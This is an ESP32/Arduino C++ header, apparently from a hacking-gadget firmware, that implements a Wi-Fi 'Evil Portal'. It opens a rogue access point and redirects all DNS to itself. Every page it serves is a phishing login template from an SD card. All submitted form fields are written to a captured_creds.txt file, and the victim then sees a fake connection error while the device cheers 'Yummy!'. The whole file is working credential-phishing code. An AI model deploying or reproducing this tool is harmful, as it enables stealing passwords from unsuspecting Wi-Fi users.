#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD_MMC.h>
#include "FaceHandler.h"
#include "AudioHandler.h"

class EvilPortal {
private:
    static DNSServer dnsServer;
    static AsyncWebServer server;
    static bool is_running;
    static String current_template_path;
    static int captured_count;

public:
    static void init() {
        is_running = false;
        captured_count = 0;
    }

    static void start(const char* ssid, const char* template_file) {
        if (is_running) stop();

        Serial.printf("Iniciando Evil Portal: %s (%s)\n", ssid, template_file);
        current_template_path = String(template_file);

        // 1. AP Mode
        WiFi.mode(WIFI_AP);
        WiFi.softAP(ssid);

        // 2. DNS Server (Captive Portal - Redirect ALL to IP)
        // 53 is DNS port
        dnsServer.start(53, "*", WiFi.softAPIP());

        // 3. Web Server
        // Serve the selected HTML template for root /
        server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
            if (SD_MMC.exists(current_template_path)) {
                request->send(SD_MMC, current_template_path, "text/html");
            } else {
                request->send(200, "text/plain", "Erro: Template nao encontrado no SD.");
            }
        });

        // Catch-all redirect for captive portal detection (Apple/Android checks)
        server.onNotFound([](AsyncWebServerRequest *request){
            if (SD_MMC.exists(current_template_path)) {
                request->send(SD_MMC, current_template_path, "text/html");
            } else {
                request->send(200, "text/plain", "Portal Ativo");
            }
        });

        // Capture Login
        server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
            String log_entry = "--- Captura: " + String(millis()) + " ---\n";

            int params = request->params();
            for(int i=0;i<params;i++){
                AsyncWebParameter* p = request->getParam(i);
                if(p->isPost()){
                    log_entry += p->name() + ": " + p->value() + "\n";
                }
            }

            // Save to SD
            File f = SD_MMC.open("/captured_creds.txt", FILE_APPEND);
            if (f) {
                f.println(log_entry);
                f.close();
                captured_count++;
                Serial.println("CREDENTIAL CAPTURED!");

                // Visual Feedback
                FaceHandler::setFace(FACE_HAPPY);
                AudioHandler::playWav("/success_pt.wav"); // "Yummy!"
            }

            // Redirect to something harmless or error
            request->send(200, "text/html", "<h1>Erro de Conexao</h1><p>Tente novamente mais tarde.</p>");
        });

        server.begin();
        is_running = true;
        FaceHandler::setFace(FACE_COOL); // Evil/Cool face
    }

    static void stop() {
        if (is_running) {
            dnsServer.stop();
            server.end();
            WiFi.softAPdisconnect(true);
            is_running = false;
            Serial.println("Evil Portal Parado");
            FaceHandler::setFace(FACE_NEUTRAL);
        }
    }

    static void loop() {
        if (is_running) {
            dnsServer.processNextRequest();
        }
    }

    static int getCapturedCount() {
        return captured_count;
    }

    static bool isRunning() {
        return is_running;
    }
};

DNSServer EvilPortal::dnsServer;
AsyncWebServer EvilPortal::server(80);
bool EvilPortal::is_running = false;
String EvilPortal::current_template_path = "";
int EvilPortal::captured_count = 0;

#endif
